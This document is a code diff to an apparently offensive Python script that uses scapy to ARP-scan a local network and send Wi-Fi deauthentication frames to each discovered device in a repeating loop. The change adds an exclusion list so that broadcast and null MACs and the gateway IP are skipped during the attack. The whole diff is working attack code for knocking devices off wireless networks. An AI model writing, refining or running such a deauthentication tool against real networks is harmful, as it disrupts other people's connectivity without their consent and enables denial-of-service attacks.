@@ -6,7 +6,7 @@ from typing import TypedDict, List
 from scapy.all import ARP, Ether, srp, send, RadioTap, Dot11, Dot11Deauth, sendp
 
 DEFAULT_IP_RANGE = "192.168.1.0/24"
-
+exclusions = ['00:00:00:00:00:00', 'ff:ff:ff:ff:ff:ff', '192.168.1.1']
 class Device(TypedDict):
     ip: str
     mac: str
@@ -48,6 +48,7 @@ if __name__ == "__main__":
         for d in devices: print(cstr("purple", f"{d['mac']} - {d['ip']}"))
         print('\n')
         for device in devices:
+            if device['mac'] in exclusions or device['ip'] in exclusions: continue
             print(cstr("orange", "IP: ", b=True), cstr("blue", f"{device['ip']}  "), cstr("orange", "MAC: "), cstr("blue", f"{device['mac']}"))
             deauth(device['mac'], bssid, iface, inter, count, verbose)
         time.sleep(attack_inter)
